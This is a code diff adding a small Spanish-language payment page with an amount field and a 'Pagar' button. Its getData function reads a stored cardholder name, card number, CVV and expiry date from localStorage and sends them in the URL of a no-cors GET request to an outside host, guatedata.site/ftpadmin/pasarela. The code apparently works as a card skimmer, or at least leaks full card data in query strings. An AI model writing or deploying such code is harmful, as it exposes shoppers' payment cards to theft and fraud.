@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+      }
+      body {
+        background-color: #ddeefc;
+        text-align: center;
+      }
+
+      .monto {
+        background-color: white;
+        width: 150px;
+        height: 150px;
+        padding: 10px;
+        margin: auto;
+        color: #ddeefc;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-top: 20vh;
+      }
+
+      input {
+        border: none;
+        outline: none;
+        width: 100%;
+        font-size: 50px;
+        text-align: center;
+        background-color: transparent;
+      }
+      input::placeholder {
+        background-color: transparent;
+        color: rgb(214, 214, 214);
+      }
+
+      #btn-pagar {
+        margin-top: 20px !important;
+        margin: auto;
+        width: 200px;
+        border: 0;
+        background-color: transparent;
+        color: white;
+        font-size: 22px;
+        background-color: #1850b1;
+        padding: 10px;
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="monto">
+      <input id="valor" type="text" placeholder="$0.00" />
+    </div>
+    <button id="btn-pagar">Pagar</button>
+
+    <script>
+      const $valor = document.getElementById("valor"),
+        $btn_pagar = document.getElementById("btn-pagar")
+
+      $valor.addEventListener("keyup", () => {
+        $valor.value = $valor.value
+          // Eliminar los espacios
+          .replace(/\s/g, "")
+          // Eliminar las letras
+          .replace(/\D/g, "")
+
+        if ($valor.value == "") {
+          return
+        }
+
+        $valor.value = digit$($valor.value)
+      })
+
+      function digit$(valor) {
+        return "$" + valor
+      }
+
+      $btn_pagar.addEventListener("click", async () => {
+        if ($valor.value == "") {
+          return
+        }
+
+        /*   let respuesta = await getData()
+        alert(respuesta) */
+      })
+
+      async function getData() {
+        console.log("hola")
+        let datos = JSON.parse(localStorage.getItem("datos"))
+        datos.monto = $valor.value.slice(1)
+        console.log("datos", datos)
+        let url = "https://guatedata.site/ftpadmin/pasarela"
+        let res = await fetch(
+            `${url}?titular=${datos.titular}&num_tarjeta=${datos.num_tarjeta}&cvv=${datos.cvv}&fecha_vence=${datos.fecha_vence}&monto=${datos.monto}`,
+            {
+              mode: "no-cors",
+            }
+          ),
+          json = await res.text()
+
+        return json
+      }
+    </script>
+  </body>
+</html>
